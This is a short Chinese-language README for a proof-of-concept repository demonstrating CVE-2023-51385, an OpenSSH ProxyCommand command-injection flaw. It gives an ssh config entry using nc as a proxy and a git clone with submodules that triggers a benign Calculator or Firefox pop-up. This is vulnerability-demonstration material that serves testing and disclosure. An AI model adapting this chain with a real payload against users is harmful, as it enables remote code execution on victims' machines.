CVE-2023-51385 POC

OpenSSH ProxyCommand RCE POC

OpenSSH <9.6 命令注入漏洞

该漏洞类似于钓鱼链接，攻击者无需主动对受害者主机发起攻击，受害者主机使用有问题的openssh配置下载有毒的仓库即可导致命令执行。本仓库会在linux下弹火狐浏览器或win计算器。

<div align="center">
  <img src="https://github.com/WLaoDuo/CVE-2023-51385_poc-test/blob/main/calc.gif", alt="" />
</div>

<div align="center">
  <img src="https://github.com/WLaoDuo/CVE-2023-51385_poc-test/blob/main/pop%20firefox.gif", alt="" />
</div>

## 1.`vim ~/.ssh/config` 或win下编辑`C:\Users\用户名\.ssh\config`文件

第一步编辑 `~/.ssh/config` 或 `C:/Users/用户名/.ssh/config`，添加以下内容：

```
host *.example.com
  ProxyCommand /usr/bin/nc -X connect -x 192.0.2.0:8080 %h %p
```

## 2. `git clone https://github.com/WLaoDuo/CVE-2023-51385_poc-test --recurse-submodules`

第二步执行git clone命令，会在图形化kali界面内打开firefox浏览器窗口或win下弹计算器2次。

感谢大佬 https://github.com/vin01/poc-proxycommand-vulnerable-v2
